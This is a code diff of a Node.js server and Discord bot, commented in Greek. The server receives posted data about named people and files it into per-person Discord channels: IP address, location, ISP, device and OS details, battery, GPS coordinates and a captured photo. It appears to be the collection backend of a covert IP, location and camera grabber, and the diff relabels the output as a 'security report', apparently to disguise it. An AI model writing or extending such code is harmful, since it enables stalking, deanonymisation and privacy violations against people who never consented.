@@ -18,18 +18,16 @@ const client = new Client({
     ]
 });
 
-// ΤΑΥΤΟΤΗΤΕΣ
 const TOKEN = process.env.BOT_TOKEN;
 const SERVER_ID = process.env.SERVER_ID;
-const CATEGORY_ID = '1545817704127266876'; // Η κατηγορία όπου θα δημιουργούνται τα κανάλια
+const CATEGORY_ID = '1545817704127266876';
 
-// Αποθήκη για να θυμόμαστε τι έχουμε στείλει
 const messageCache = new Map();
 
 // ---------- ΕΚΚΙΝΗΣΗ BOT ----------
 client.once('ready', () => {
     console.log(`✅ Bot online: ${client.user.tag}`);
-    console.log(`📁 Θα δημιουργώ κανάλια στην κατηγορία ID: ${CATEGORY_ID}`);
+    console.log(`📁 Κατηγορία ID: ${CATEGORY_ID}`);
     
     const guild = client.guilds.cache.get(SERVER_ID);
     if (guild) {
@@ -53,70 +51,132 @@ function cleanName(name) {
 }
 
 function parseDataToEmbed(dataString, userName, photoBase64) {
+    // Δημιουργία embed
     const embed = new EmbedBuilder()
-        .setColor(0x00ff88)
-        .setTitle('📸 ΝΕΑ ΚΑΤΑΓΡΑΦΗ')
-        .setAuthor({ 
-            name: userName || 'Άγνωστος Χρήστης',
-            iconURL: 'https://cdn.discordapp.com/emojis/1085933512993218630.png'
-        })
+        .setColor(0x5865F2) // Discord blue
+        .setTitle('🔒 ΑΝΑΦΟΡΑ ΑΣΦΑΛΕΙΑΣ')
+        .setDescription(`**Χρήστης:** ${userName || 'Άγνωστος'}`)
         .setTimestamp()
         .setFooter({ 
-            text: 'Secure Connection System',
+            text: 'Secure Connection System • All data is logged',
             iconURL: 'https://cdn.discordapp.com/emojis/1085933512993218630.png'
-        });
+        })
+        .setThumbnail('https://cdn.discordapp.com/emojis/1085933512993218630.png');
 
+    // Αν υπάρχει φωτογραφία
     if (photoBase64 && photoBase64.startsWith('data:image/')) {
         embed.setImage('attachment://photo.jpg');
     }
 
-    const lines = dataString.split('\n').filter(line => line.trim() !== '');
-    let currentField = '';
+    // Καθαρισμός και διαχωρισμός γραμμών
+    const lines = dataString.split('\n')
+        .map(line => line.trim())
+        .filter(line => line.length > 0);
+
+    // Ορισμός των πεδίων με τα emojis τους
+    const fieldMap = {
+        '👤': { name: '👤 Στοιχεία Χρήστη', icon: '👤' },
+        '🌐': { name: '🌐 Διεύθυνση IP', icon: '🌐' },
+        '🏙️': { name: '🏙️ Τοποθεσία', icon: '🏙️' },
+        '🌍': { name: '🌍 Χώρα', icon: '🌍' },
+        '📡': { name: '📡 Πάροχος', icon: '📡' },
+        '🗺️': { name: '🗺️ Χάρτης', icon: '🗺️' },
+        '📱': { name: '📱 Συσκευή', icon: '📱' },
+        '💿': { name: '💿 Λειτουργικό Σύστημα', icon: '💿' },
+        '🖥️': { name: '🖥️ Ανάλυση Οθόνης', icon: '🖥️' },
+        '🔋': { name: '🔋 Μπαταρία', icon: '🔋' },
+        '📶': { name: '📶 Τύπος Σύνδεσης', icon: '📶' },
+        '🕐': { name: '🕐 Ζώνη Ώρας', icon: '🕐' },
+        '⏱️': { name: '⏱️ Χρόνος Σύνδεσης', icon: '⏱️' },
+        '📍': { name: '📍 Συντεταγμένες GPS', icon: '📍' },
+        '🎯': { name: '🎯 Ακρίβεια GPS', icon: '🎯' },
+        '📊': { name: '📊 Στατιστικά', icon: '📊' }
+    };
+
+    let currentField = null;
     let currentValue = '';
     let fields = [];
-    
+    let generalInfo = [];
+
     for (const line of lines) {
-        if (line.match(/^[📊👤🌐🏙️🌍📡🗺️📱💿🖥️🔋📶🕐⏱️📍🎯]/)) {
-            if (currentField && currentValue) {
-                fields.push({ name: currentField, value: currentValue, inline: false });
+        // Έλεγχος αν η γραμμή ξεκινά με emoji πεδίου
+        let matchedEmoji = null;
+        for (const emoji of Object.keys(fieldMap)) {
+            if (line.startsWith(emoji)) {
+                matchedEmoji = emoji;
+                break;
             }
-            const parts = line.split(':');
+        }
+
+        if (matchedEmoji) {
+            // Αποθήκευση προηγούμενου πεδίου
+            if (currentField && currentValue) {
+                fields.push({
+                    name: currentField,
+                    value: currentValue.trim(),
+                    inline: false
+                });
+            }
+            
+            // Δημιουργία νέου πεδίου
+            const parts = line.split(':').map(s => s.trim());
             if (parts.length >= 2) {
-                currentField = parts[0].trim();
-                currentValue = parts.slice(1).join(':').trim();
+                const value = parts.slice(1).join(':').trim();
+                // Αφαίρεση ** από την τιμή
+                const cleanValue = value.replace(/\*\*/g, '');
+                currentField = fieldMap[matchedEmoji].name;
+                currentValue = cleanValue;
             } else {
                 currentField = 'ℹ️ Πληροφορία';
-                currentValue = line;
+                currentValue = line.replace(/\*\*/g, '');
             }
         } else {
-            if (currentValue) {
-                currentValue += '\n' + line;
+            // Συνέχιση τρέχοντος πεδίου
+            if (currentField) {
+                currentValue += '\n' + line.replace(/\*\*/g, '');
             } else {
-                currentValue = line;
+                // Γενικές πληροφορίες
+                generalInfo.push(line.replace(/\*\*/g, ''));
             }
         }
     }
-    
+
+    // Αποθήκευση τελευταίου πεδίου
     if (currentField && currentValue) {
-        fields.push({ name: currentField, value: currentValue, inline: false });
+        fields.push({
+            name: currentField,
+            value: currentValue.trim(),
+            inline: false
+        });
     }
-    
-    if (fields.length === 0) {
-        embed.setDescription('```' + dataString + '```');
-    } else {
-        for (const field of fields) {
-            let value = field.value;
-            if (value.length > 1024) {
-                value = value.substring(0, 1020) + '...';
-            }
-            embed.addFields({ 
-                name: field.name, 
-                value: value || 'Δεν υπάρχουν δεδομένα',
-                inline: false 
-            });
+
+    // Αν υπάρχουν γενικές πληροφορίες, τις προσθέτουμε
+    if (generalInfo.length > 0) {
+        embed.addFields({
+            name: '📋 Γενικές Πληροφορίες',
+            value: generalInfo.join('\n').substring(0, 1024),
+            inline: false
+        });
+    }
+
+    // Προσθήκη πεδίων στο embed
+    for (const field of fields) {
+        let value = field.value;
+        if (value.length > 1024) {
+            value = value.substring(0, 1020) + '...';
         }
+        embed.addFields({
+            name: field.name,
+            value: value || 'Δεν υπάρχουν δεδομένα',
+            inline: false
+        });
     }
-    
+
+    // Αν δεν υπάρχουν καθόλου πεδία, βάζουμε όλα σε description
+    if (fields.length === 0 && generalInfo.length === 0) {
+        embed.setDescription('```' + dataString.replace(/\*\*/g, '') + '```');
+    }
+
     return embed;
 }
 
@@ -128,7 +188,7 @@ async function clearChannelMessages(channel) {
             console.log(`🗑️ Διαγράφηκαν ${messages.size} παλιά μηνύματα`);
         }
     } catch (error) {
-        console.log('⚠️ Δεν μπόρεσα να διαγράψω όλα τα μηνύματα (μπορεί να είναι παλιά)');
+        console.log('⚠️ Δεν μπόρεσα να διαγράψω όλα τα μηνύματα');
     }
 }
 
@@ -140,24 +200,21 @@ app.post('/', async (req, res) => {
     const { name, data, photo } = req.body;
     
     if (!name || !data) {
-        console.error('❌ Λείπουν δεδομένα (name ή data)');
+        console.error('❌ Λείπουν δεδομένα');
         return res.status(400).json({ 
             success: false, 
-            error: 'Missing name or data',
-            received: req.body 
+            error: 'Missing name or data'
         });
     }
     
     try {
         const guild = client.guilds.cache.get(SERVER_ID);
         if (!guild) {
-            console.error(`❌ Server με ID ${SERVER_ID} δεν βρέθηκε`);
             return res.status(500).json({ success: false, error: 'Server not found' });
         }
         
         const category = guild.channels.cache.get(CATEGORY_ID);
         if (!category) {
-            console.error(`❌ Κατηγορία με ID ${CATEGORY_ID} δεν βρέθηκε`);
             return res.status(500).json({ success: false, error: 'Category not found' });
         }
         
@@ -165,14 +222,12 @@ app.post('/', async (req, res) => {
         const channelName = `👤-${cleanName(name)}`;
         console.log(`📝 Αναζήτηση/δημιουργία καναλιού: ${channelName}`);
         
-        // Αναζήτηση για υπάρχον κανάλι
         let channel = guild.channels.cache.find(
             c => c.type === ChannelType.GuildText && 
             c.name === channelName && 
             c.parentId === CATEGORY_ID
         );
         
-        // Δημιουργία νέου καναλιού αν δεν υπάρχει
         if (!channel) {
             console.log(`📝 Δημιουργία νέου καναλιού...`);
             channel = await guild.channels.create({
@@ -186,17 +241,16 @@ app.post('/', async (req, res) => {
             console.log(`✅ Βρέθηκε υπάρχον κανάλι: ${channel.name}`);
         }
         
-        // Δημιουργία hash των νέων δεδομένων
+        // Έλεγχος αν τα δεδομένα είναι ίδια
         const dataHash = Buffer.from(data + (photo || '')).toString('base64').substring(0, 50);
         const cacheKey = `${channel.id}_${name}`;
         
-        // Έλεγχος αν τα δεδομένα είναι ίδια με τα παλιά
         if (messageCache.has(cacheKey) && messageCache.get(cacheKey) === dataHash) {
             console.log(`⏭️ Τα δεδομένα είναι ίδια, δεν στέλνω ξανά`);
             return res.json({ 
                 success: true, 
                 channel: channel.name,
-                message: 'Data unchanged - no new message sent'
+                message: 'Data unchanged'
             });
         }
         
@@ -206,10 +260,9 @@ app.post('/', async (req, res) => {
         // Δημιουργία embed
         const embed = parseDataToEmbed(data, name, photo);
         
-        // Προετοιμασία για αποστολή
+        // Προετοιμασία αποστολής
         let messageOptions = { embeds: [embed] };
         
-        // Αν υπάρχει φωτογραφία, τη στέλνουμε ως attachment
         if (photo && photo.startsWith('data:image/')) {
             const base64Data = photo.replace(/^data:image\/\w+;base64,/, '');
             const buffer = Buffer.from(base64Data, 'base64');
@@ -233,16 +286,15 @@ app.post('/', async (req, res) => {
         });
         
     } catch (error) {
-        console.error('❌ Σφάλμα κατά την αποστολή:', error);
+        console.error('❌ Σφάλμα:', error);
         res.status(500).json({ 
             success: false, 
-            error: error.message,
-            stack: error.stack 
+            error: error.message
         });
     }
 });
 
-// Endpoint για έλεγχο υγείας
+// Health check
 app.get('/', (req, res) => {
     res.json({
         status: 'online',
@@ -252,21 +304,18 @@ app.get('/', (req, res) => {
     });
 });
 
-// Test endpoint
 app.get('/test', (req, res) => {
     res.json({
         message: '✅ Το bot λειτουργεί!',
         bot: client.user?.tag || 'not ready',
         server: client.guilds.cache.get(SERVER_ID)?.name || 'not connected',
-        category: CATEGORY_ID,
-        instructions: 'Στείλε POST request στο / με { name, data, photo }'
+        category: CATEGORY_ID
     });
 });
 
 // ---------- ΕΚΚΙΝΗΣΗ ----------
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🌐 Server τρέχει στη θύρα: ${PORT}`);
-    console.log(`🔗 Δοκίμασε το test endpoint: https://discord-bot-kvbn.onrender.com/test`);
 });
 
 client.login(TOKEN).catch(err => {
